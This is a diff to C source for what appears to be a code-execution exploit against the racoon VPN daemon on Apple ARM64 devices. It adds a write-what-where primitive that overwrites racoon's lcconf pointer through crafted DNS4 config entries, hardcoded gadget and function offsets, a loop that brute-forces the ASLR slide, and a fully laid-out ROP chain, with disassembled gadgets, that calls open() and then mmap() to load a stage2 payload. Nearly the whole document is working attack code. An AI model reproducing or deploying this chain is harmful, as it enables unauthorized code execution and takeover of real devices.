@@ -30,9 +30,7 @@ struct offset_struct {
 	uint64_t pivot_x21;
 	uint64_t memmove;
 	uint64_t lcconf_counter_offset;
-	uint64_t dispatcher;
-	uint64_t regloader;
-	uint64_t stackloader;
+	uint64_t BEAST_GADGET;
 	uint64_t longjmp;
 	uint64_t open;
 	uint64_t mmap;
@@ -44,6 +42,7 @@ typedef struct offset_struct offset_struct_t;
 
 void stage1(int fd, offset_struct_t * offsets);
 void get_ip_from_value(char * ip, uint32_t value);
+void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what);
 
 uint32_t oldhigher_lcconf = 0xffffffff; // older value is unknown but we don't write to any address which has all high bits set so we can just set them here and the first time we need it in code we can handle it
 char dns4_array_to_lcconf_distance[16];
@@ -56,10 +55,10 @@ void generate(char* filename, offset_struct_t * offsets) {
 #define shift_mask(value,shift,mask) ((value >> shift) & mask)
 #define shiftm(value,shift) shift_mask(value,shift,0xff)
 void get_ip_from_value(char * ip, uint32_t value) {
-	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,24),shiftm(value,16),shiftm(value,8),value & 0xff);
+	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,0),shiftm(value,8),shiftm(value,16),shiftm(value,24));
 }
 void get_ip_from_value_int(char * ip, int value) {
-	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,24),shiftm(value,16),shiftm(value,8),value & 0xff);
+	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,0),shiftm(value,8),shiftm(value,16),shiftm(value,24));
 }
 
 // overwrites the lcconf pointer in racoon
@@ -75,7 +74,7 @@ void change_lcconf(int fd, uint64_t new_addr) {
 	uint32_t higher = (new_addr >> 32) & 0xffffffff;
 
 	// overwrite the lower half of the lcconf pointer
-	char value_ip[16]; // 255.255.255.255 is max so 16 is always enough=
+	char value_ip[16]; // 255.255.255.255 is max so 16 is always enough
 	get_ip_from_value((char*)&value_ip,lower);
 	snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, www, dns4_array_to_lcconf_distance, value_ip);
 
@@ -149,7 +148,7 @@ void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what) {
 }
 
 uint64_t get_ropchain_addr(offset_struct_t * offsets) {
-	uint64_t test = offsets->memmove;
+	uint64_t test = offsets->max_slide + offsets->memmove + 16;
 	union converter {
 		uint64_t addr;
 		char buf[8];
@@ -169,7 +168,10 @@ uint64_t get_ropchain_addr(offset_struct_t * offsets) {
 void stage1(int fd, offset_struct_t * offsets) {
 	// setup stage1
 	// get the ip which reflex the distance between the dns4_array and lcconf as an int
-	get_ip_from_value_int((char*)&dns4_array_to_lcconf_distance,offsets->dns4_array_to_lcconf);
+	get_ip_from_value_int((char*)&dns4_array_to_lcconf_distance,offsets->dns4_array_to_lcconf / 4);
+	
+	/*www64(fd,offsets,0x4141,0x4141);
+	return;*/
 
 	// get an address which is in the region that is always writeable and doesn't cotain a quote if we convert it into a string
 	uint64_t ropchain_addr = get_ropchain_addr(offsets);
@@ -199,14 +201,15 @@ void stage1(int fd, offset_struct_t * offsets) {
 			default:
 				break;
 		}
+		curr_ropchain_addr += 8;
 		curr_gadget = curr_gadget->next;
 	}
 	int iterations = (offsets->max_slide/offsets->slide_value);
 	printf("%d iterations\n",iterations);
-	for (int i = 0; i < iterations; i++) {
+	for (int i = iterations; i >= 0; i--) {
 		uint64_t slide = i*offsets->slide_value;
-		www64(fd,offsets,offsets->pivot_x21+slide,offsets->memmove+slide);
-
+		//www64(fd,offsets,0x4141414141,offsets->memmove+slide);
+		www64(fd,offsets,offsets->memmove+slide,offsets->pivot_x21+slide);
 		rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
 		uint64_t curr_ropchain_addr = ropchain_addr;
 		while (curr_gadget != NULL) {
@@ -262,12 +265,14 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 {
 	offset_struct_t myoffsets;
 	myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
-	myoffsets.lcconf_counter_offset = 0x100; // FIXME
+	myoffsets.lcconf_counter_offset = 0x10c;
 	myoffsets.memmove = 0x1aa0b8bb8;
 	myoffsets.max_slide = 0x66dc000;
 	myoffsets.slide_value = 0x4000;
 	myoffsets.pivot_x21 = 0x1990198fc;
 	myoffsets.str_buff_offset = 8;
+	myoffsets.BEAST_GADGET = 0x1a0478c70;
+	myoffsets.stage2_base = 0x420000000;
 
 
 
@@ -316,32 +321,31 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	   So basically we want to set 0x58 to our next gadget and 0x68 to the address of our new stack
 
 	[3]:
-		(regloader addresses aren't from my dyld cache)
-		regloader:
-        0x180ee6048      e00317aa       mov x0, x23 // loads higher regs into lower ones
-        0x180ee604c      e10316aa       mov x1, x22
-        0x180ee6050      e20318aa       mov x2, x24
-        0x180ee6054      e30319aa       mov x3, x25
-        0x180ee6058      e4031aaa       mov x4, x26
-        0x180ee605c      e5031baa       mov x5, x27
-        0x180ee6060      80033fd6       blr x28
+	
+	Siguza found this beautiful gadget using r2 and some mask tricks:
+		0x1a0478c70      e40316aa       mov x4, x22
+		0x1a0478c74      e50314aa       mov x5, x20
+		0x1a0478c78      e60315aa       mov x6, x21
+		0x1a0478c7c      e70313aa       mov x7, x19
+		0x1a0478c80      e0031aaa       mov x0, x26
+		0x1a0478c84      e10319aa       mov x1, x25
+		0x1a0478c88      e20318aa       mov x2, x24
+		0x1a0478c8c      e30317aa       mov x3, x23
+		0x1a0478c90      60033fd6       blr x27                    ;[0]
+		0x1a0478c94      fd7b47a9       ldp x29, x30, [sp, 0x70]
+		0x1a0478c98      f44f46a9       ldp x20, x19, [sp, 0x60]
+		0x1a0478c9c      f65745a9       ldp x22, x21, [sp, 0x50]
+		0x1a0478ca0      f85f44a9       ldp x24, x23, [sp, 0x40]
+		0x1a0478ca4      fa6743a9       ldp x26, x25, [sp, 0x30]
+		0x1a0478ca8      fc6f42a9       ldp x28, x27, [sp, 0x20]
+		0x1a0478cac      e923416d       ldp d9, d8, [sp, 0x10]
+		0x1a0478cb0      ff030291       add sp, sp, 0x80
+		0x1a0478cb4      c0035fd6       ret
 
-		This will give us control over x0-x5 by using x23,x22,x24,x25,x26 and x27 which we control via the longjmp
-		But we need another gadget to set x30 otherwise we can't continue, so this will jump to our dispatcher [4]
-
-	[4]:
-		(dispatcher addresses aren't from my dyld cache)
-        0x180d62e48      a0023fd6       blr x21
-        0x180d62e4c      fd7b43a9       ldp x29, x30, [sp, 0x30]
-        0x180d62e50      f44f42a9       ldp x20, x19, [sp, 0x20]
-        0x180d62e54      f65741a9       ldp x22, x21, [sp, 0x10]
-        0x180d62e58      ff030191       add sp, sp, 0x40
-        0x180d62e5c      c0035fd6       ret
-
-		Now this is our dispatcher it will straight jump to x21 (which we control [2]) with the args we setup in [3]
-		and after that it will load x30 from the stack at 0x38 and add 0x40 to the stack, so the stack will move from 0xb0 to 0xf0
 		We will call open("/private/etc/racoon/<func pointer>", O_RDONLY); the func pointer will be used to know which slide we need to use
-		Path is stored at 0xc0 
+		Path is stored at 0xb0, we can do this because we assume that the stage2 baseaddress will always have a zero byte
+
+		This means we need to load the address of the path into x26 at [1], x27 will contain the open func pointer and x25 O_RDONLY
 
 		path: (/private/etc/racoon/<func pointer>\x00):
 		0x2f707269 /pri
@@ -352,45 +356,31 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 		0xXXXXXXXX <func pointer>
 		0x00
 		
-		Fingers crossed thatt the string will survive when we start to call funcs...
+		Fingers crossed that the string will survive when we start to call funcs...
 
-	[5]:
-		we need to load new regs now, we will use a stack loader for that
-		(again not from my cache)
-        0x18098e2a8      fd7b46a9       ldp x29, x30, [sp, 0x60]
-        0x18098e2ac      f44f45a9       ldp x20, x19, [sp, 0x50]
-        0x18098e2b0      f65744a9       ldp x22, x21, [sp, 0x40]
-        0x18098e2b4      f85f43a9       ldp x24, x23, [sp, 0x30]
-        0x18098e2b8      fa6742a9       ldp x26, x25, [sp, 0x20]
-        0x18098e2bc      fc6f41a9       ldp x28, x27, [sp, 0x10]
-        0x18098e2c0      ffc30191       add sp, sp, 0x70
-        0x18098e2c4      c0035fd6       ret
-
-		So now we load all the regs and afterwards the stack will be moved from 0xf0 to 0x160
-
-	[6]:
-		 regloader again
-	[7]:
-		dispatcher to mmap(stage2_base,stage2_size,PROT_READ | PROT_WRITE,STAGE2_FD,0)
+	[4]:
+		Now we have fully loaded gadgets again and we will just jump back to the gadget used in [3] but ofc with other args
+		to call mmap(stage2_base,stage2_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_FIXED,STAGE2_FD,0)
 		
-		Stack will move from 0x160 to 0x1a0
-
-	[8]:
+		This means that x26 has to be the stage2_base, x25 has to be the stage2_size, x24 has to bb PROT_READ | PROT_WRITE, x23 STAGE2_FD and x22 0
+		
+	[5]:
 		when we are here x0 contains the return value of mmap/the stage so we just jump to longjmp and let stage2 handle all of the other stuff
 	*/
 	ROP_SETUP(&myoffsets);
 	ADD_OFFSET_GADGET(0);					   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
-	ADD_GADGET();							   // 0x08		[2] x20
-	ADD_CODE_GADGET(myoffsets.open);		   // 0x10		[2] x21 [4] dispatcher: jump/next gadget
-	ADD_STATIC_GADGET(O_RDONLY);			   // 0x18		[2] x22 [3] regloader: x1/second arg
-	ADD_OFFSET_GADGET(0xc0)					   // 0x20		[2] x23 [3] regloader: x0/first arg (path for open)
-	ADD_GADGET();							   // 0x28		[2] x24 [3] regloader: x2/thrid arg
-	ADD_GADGET();							   // 0x30		[2] x25 [3] regloader: x3/fourth arg
-	ADD_GADGET();							   // 0x38		[2] x26 [3] regloader: x4/fifth arg
-	ADD_GADGET();							   // 0x40		[2] x27 [3] regloader: x5/sixth arg
-	ADD_CODE_GADGET(myoffsets.dispatcher);	   // 0x48		[2] x28 [3] regloader: jump/next gadget
-	ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
-	ADD_CODE_GADGET(myoffsets.regloader);	   // 0x58		[2] x30 (next gadget)
+	ADD_GADGET();							   // 0x08		[2] x20 [3] x5/sixth arg
+	ADD_GADGET();							   // 0x10		[2] x21 [3] x6/seventh arg
+	ADD_GADGET();							   // 0x18		[2] x22 [3] x4/fifth arg 
+	ADD_GADGET();							   // 0x20		[2] x23 [3] x3/fourth arg
+	ADD_GADGET();							   // 0x28		[2] x24 [3] x2/third arg
+	ADD_STATIC_GADGET(O_RDONLY);			   // 0x30		[2] x25 [3] x1/second arg
+	ADD_OFFSET_GADGET(0xb0);				   // 0x38		[2] x26 [3] x0/first arg
+	ADD_CODE_GADGET(myoffsets.open);		   // 0x40		[2] x27 [3] call gadget
+	ADD_GADGET();							   // 0x48		[2] x28 
+	//ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
+	ADD_STATIC_GADGET(0x42424242);
+	ADD_CODE_GADGET(myoffsets.BEAST_GADGET);   // 0x58		[2] x30 (next gadget)
 	ADD_GADGET();							   // 0x60		[2] x29
 	ADD_OFFSET_GADGET(0xb0);				   // 0x68		[2] x2  (new stack)
 	ADD_GADGET();							   // 0x70		[2] weird Dx registers
@@ -402,40 +392,46 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	ADD_GADGET();							   // 0xa0		[2] weird Dx registers
 	ADD_GADGET();							   // 0xa8		[2] weird Dx registers
 
-	ADD_GADGET();							   // 0xb0		[2] new stack top
-	ADD_GADGET();							   // 0xb8
-	ADD_STATIC_GADGET(0x2f707269);			   // 0xc0		[4] x22 (/pri)
-	ADD_STATIC_GADGET(0x76617465);			   // 0xc8		[4] x21 (vate)
-	ADD_STATIC_GADGET(0x2f657463);			   // 0xd0		[4] x20 (/etc)
-	ADD_STATIC_GADGET(0x2f706163);			   // 0xd8		[4] x19 (/rac)
-	ADD_STATIC_GADGET(0x6f6f6e2f);			   // 0xe0		[4] x29 (oon/)
-	ADD_CODE_GADGET(myoffsets.stackloader);	   // 0xe8		[4] x30/ld load (next gadget)
+	ADD_STATIC_GADGET(0x2f707269);			   // 0xb0		[2] new stack top (/pri)
+	ADD_STATIC_GADGET(0x76617465);			   // 0xb8		                  (vate)
+	ADD_STATIC_GADGET(0x2f657463);			   // 0xc0		[3] d9		      (/etc)
+	ADD_STATIC_GADGET(0x2f706163);			   // 0xc8		[3] d8            (/rac)
+	ADD_STATIC_GADGET(0x6f6f6e2f);			   // 0xd0		[3] x28           (oon/)
+	ADD_CODE_GADGET(myoffsets.mmap);		   // 0xd8		[3] x27 [4] call gadget
+	ADD_STATIC_GADGET(myoffsets.stage2_base);  // 0xe0		[3] x26 [4] x0/first arg
+	ADD_STATIC_GADGET(myoffsets.stage2_size);  // 0xe8		[3] x25 [4] x1/second arg
+	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE); // 0xf0		[3] x24 [4] x2/third arg
+	ADD_STATIC_GADGET(MAP_FIXED | MAP_PRIVATE) // 0xf8		[3] x23 [4] x3/fourth arg
+	ADD_STATIC_GADGET(STAGE2_FD);			   // 0x100		[3] x22 [4] x4/fifth arg
+	ADD_STATIC_GADGET(0);					   // 0x108		[3] x21 [4] x5/sixth arg
+	ADD_GADGET();							   // 0x110		[3] x20 [4] x6/seventh arg
+	ADD_GADGET();							   // 0x118		[3] x19 [4] x7/eighth arg
+	ADD_GADGET();							   // 0x120		[3] x29
+	//ADD_CODE_GADGET(myoffsets.BEAST_GADGET);   // 0x128		[3] x30 (next gadget)
+	ADD_STATIC_GADGET(0x41414141);
 
-	ADD_STATIC_GADGET(0x00);				   // 0xf0		[4] stack will be here after dispatch returned (zero char for the string)
-	ADD_GADGET();							   // 0xf8
-	ADD_CODE_GADGET(myoffsets.dispatcher);	   // 0x100		[5] x28 [6] regloader: jump/next gadget
-	ADD_GADGET();							   // 0x108		[5] x27 [6] regloader: x5/fifth arg
-	ADD_STATIC_GADGET(0);					   // 0x110		[5] x26 [6] regloader: x4/fourth arg
-	ADD_STATIC_GADGET(STAGE2_FD);			   // 0x118		[5] x25 [6] regloader: x3/fourth arg
-	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE); // 0x120		[5] x24 [6] regloader: x2/third arg
-	ADD_STATIC_GADGET(myoffsets.stage2_size);  // 0x128		[5] x23 [6] regloader: x1/second arg
-	ADD_STATIC_GADGET(myoffsets.stage2_base);  // 0x130		[5] x22 [6] regloader: x0/frist arg
-	ADD_CODE_GADGET(myoffsets.mmap);		   // 0x138		[5] x21 [7] dispatcher: jump/next gadget
-	ADD_GADGET();							   // 0x140		[5] x20
-	ADD_GADGET();							   // 0x148		[5] x19
-	ADD_GADGET();							   // 0x150		[5] x29
-	ADD_CODE_GADGET(myoffsets.regloader);	   // 0x158		[5] x30 (next gadget)
+	ADD_GADGET();							   // 0x130		[3] new stack top
+	ADD_GADGET();							   // 0x138		
+	ADD_GADGET();							   // 0x140		[4] d9
+	ADD_GADGET();							   // 0x148		[4] d8
+	ADD_GADGET();							   // 0x150		[4] x28
+	ADD_GADGET();							   // 0x158		[4] x27
+	ADD_GADGET();							   // 0x160		[4] x26
+	ADD_GADGET();							   // 0x168		[4] x25
+	ADD_GADGET();							   // 0x170		[4] x24
+	ADD_GADGET();							   // 0x178		[4] x23
+	ADD_GADGET();							   // 0x180		[4] x22
+	ADD_GADGET();							   // 0x188		[4] x21
+	ADD_GADGET();							   // 0x190		[4] x20
+	ADD_GADGET();							   // 0x198		[4] x19
+	ADD_GADGET();							   // 0x1a0		[4] x29
+	ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x1a8		[4] x30 (next gadget)
 
-	ADD_GADGET();							   // 0x160     [5] new stack top
-	ADD_GADGET();							   // 0x168     
-	ADD_GADGET();							   // 0x170     [7] x22
-	ADD_GADGET();							   // 0x178     [7] x21
-	ADD_GADGET();							   // 0x180     [7] x20
-	ADD_GADGET();							   // 0x188     [7] x19
-	ADD_GADGET();							   // 0x190     [7] x29
-	ADD_CODE_GADGET(myoffsets.longjmp)		   // 0x198     [7] x30 (next gadget) [8] kickstart of stage 2, longjmp will load from there, so start of stage2 is the new longjmp buffer
+	ADD_GADGET();							   // 0x1b0		[4] new stack top
 
-	ADD_GADGET();							   // 0x1a0     [7] new stack top
+
+
+
 
 
 
